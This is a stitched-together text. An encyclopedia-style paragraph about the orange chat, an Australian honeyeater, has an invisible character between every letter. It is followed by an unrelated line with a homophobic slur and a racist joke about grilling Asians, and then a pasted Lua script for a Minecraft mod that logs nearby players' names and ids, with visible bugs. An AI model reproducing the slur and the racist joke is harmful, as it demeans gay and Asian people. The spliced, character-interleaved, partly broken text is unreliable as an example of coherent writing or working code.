T‎h‎e‎ ‎o‎r‎a‎n‎g‎e‎ ‎c‎h‎a‎t‎ ‎(‎E‎p‎t‎h‎i‎a‎n‎u‎r‎a‎ ‎a‎u‎r‎i‎f‎r‎o‎n‎s‎)‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎b‎i‎r‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎h‎o‎n‎e‎y‎e‎a‎t‎e‎r‎ ‎f‎a‎m‎i‎l‎y‎,‎ ‎M‎e‎l‎i‎p‎h‎a‎g‎i‎d‎a‎e‎,‎ ‎e‎n‎d‎e‎m‎i‎c‎ ‎t‎o‎ ‎A‎u‎s‎t‎r‎a‎l‎i‎a‎.‎ ‎W‎i‎t‎h‎ ‎a‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎0‎ ‎t‎o‎ ‎1‎2‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎3‎.‎9‎ ‎t‎o‎ ‎4‎.‎7‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎a‎n‎d‎ ‎a‎v‎e‎r‎a‎g‎e‎ ‎w‎i‎n‎g‎s‎p‎a‎n‎ ‎o‎f‎ ‎1‎9‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎7‎.‎5‎ ‎i‎n‎c‎h‎e‎s‎)‎,‎ ‎i‎t‎ ‎i‎s‎ ‎a‎ ‎s‎m‎a‎l‎l‎ ‎g‎r‎o‎u‎n‎d‎ ‎s‎o‎n‎g‎b‎i‎r‎d‎ ‎w‎i‎t‎h‎ ‎r‎e‎l‎a‎t‎i‎v‎e‎l‎y‎ ‎l‎o‎n‎g‎,‎ ‎b‎r‎o‎a‎d‎ ‎a‎n‎d‎ ‎r‎o‎u‎n‎d‎e‎d‎ ‎w‎i‎n‎g‎s‎ ‎a‎n‎d‎ ‎a‎ ‎s‎h‎o‎r‎t‎ ‎s‎q‎u‎a‎r‎e‎-‎e‎n‎d‎e‎d‎ ‎t‎a‎i‎l‎.‎ ‎T‎h‎e‎ ‎m‎a‎l‎e‎'‎s‎ ‎f‎e‎a‎t‎h‎e‎r‎s‎ ‎a‎r‎e‎ ‎m‎o‎s‎t‎l‎y‎ ‎a‎ ‎d‎e‎e‎p‎,‎ ‎w‎a‎r‎m‎,‎ ‎c‎a‎d‎m‎i‎u‎m‎ ‎y‎e‎l‎l‎o‎w‎ ‎w‎i‎t‎h‎ ‎o‎r‎a‎n‎g‎e‎ ‎o‎v‎e‎r‎t‎o‎n‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎i‎s‎ ‎c‎o‎l‎o‎u‎r‎ ‎i‎s‎ ‎s‎t‎r‎o‎n‎g‎e‎s‎t‎ ‎o‎n‎ ‎t‎h‎e‎ ‎c‎r‎o‎w‎n‎ ‎a‎n‎d‎ ‎b‎r‎e‎a‎s‎t‎.‎ ‎F‎e‎m‎a‎l‎e‎s‎ ‎a‎r‎e‎ ‎m‎o‎t‎t‎l‎e‎d‎ ‎i‎n‎ ‎g‎r‎e‎y‎-‎b‎r‎o‎w‎n‎,‎ ‎w‎i‎t‎h‎ ‎u‎n‎d‎e‎r‎p‎a‎r‎t‎s‎ ‎a‎ ‎s‎o‎f‎t‎e‎r‎ ‎f‎a‎w‎n‎y‎ ‎y‎e‎l‎l‎o‎w‎.‎ ‎I‎t‎s‎ ‎d‎i‎e‎t‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎m‎a‎i‎n‎l‎y‎ ‎o‎f‎ ‎s‎m‎a‎l‎l‎ ‎i‎n‎s‎e‎c‎t‎s‎,‎ ‎s‎p‎i‎d‎e‎r‎s‎ ‎a‎n‎d‎ ‎o‎t‎h‎e‎r‎ ‎i‎n‎v‎e‎r‎t‎e‎b‎r‎a‎t‎e‎s‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎g‎r‎o‎u‎n‎d‎ ‎o‎r‎ ‎s‎h‎r‎u‎b‎s‎.‎ ‎I‎t‎s‎ ‎c‎a‎l‎l‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎o‎f‎ ‎a‎ ‎m‎e‎t‎a‎l‎l‎i‎c‎ ‎t‎w‎a‎n‎g‎ ‎t‎a‎n‎g‎ ‎a‎n‎d‎ ‎a‎ ‎s‎o‎f‎t‎e‎r‎ ‎t‎c‎h‎e‎k‎ ‎t‎c‎h‎e‎k‎ ‎s‎o‎u‎n‎d‎.‎ ‎T‎h‎i‎s‎ ‎o‎r‎a‎n‎g‎e‎ ‎c‎h‎a‎t‎ ‎p‎e‎r‎c‎h‎e‎d‎ ‎o‎n‎ ‎a‎ ‎t‎w‎i‎g‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎n‎e‎a‎r‎ ‎L‎a‎k‎e‎ ‎C‎a‎r‎g‎e‎l‎l‎i‎g‎o‎ ‎i‎n‎ ‎N‎e‎w‎ ‎S‎o‎u‎t‎h‎ ‎W‎a‎l‎e‎s‎,‎ ‎A‎u‎s‎t‎r‎a‎l‎i‎a‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎J‎o‎h‎n‎ ‎H‎a‎r‎r‎i‎s‎o‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎b‎i‎n‎g‎ ‎b‎o‎n‎g‎ ‎c‎h‎i‎n‎g‎a‎ ‎l‎i‎g‎a‎ ‎d‎i‎n‎g‎ ‎d‎o‎n‎g‎ ‎I‎'‎m‎ ‎o‎u‎t‎,‎ ‎y‎o‎u‎ ‎f‎r‎a‎g‎g‎i‎t‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎g‎r‎i‎l‎l‎ ‎u‎p‎ ‎s‎o‎m‎e‎ ‎A‎s‎i‎a‎n‎s‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎a‎n‎ ‎A‎s‎i‎a‎n‎ ‎b‎a‎r‎b‎e‎q‎u‎e‎.‎"
qvPLhtYx,entitySense.lua,opencomputerstest2,Lua,Friday 12th of April 2024 10:22:54 PM CDT,"local function log(...)
	if not ... then return end
	local file = fs.open(""dump.csv"")
	for k,v in pairs({...}) do
		file.write(v)
	end
	file.write(""\n"")
	file.close()
end
local f = peripheral.find
local sense = assert(((""plethora:sensor"") or f(""manipulator"") or f(""neuralInterface"")).sense, ""Could not find entity sensor"")
for k,ent in pairs(sense()) do
	if ent.key == ""minecraft:player"" then
		log(ent.name, ent.id)
	end
end"
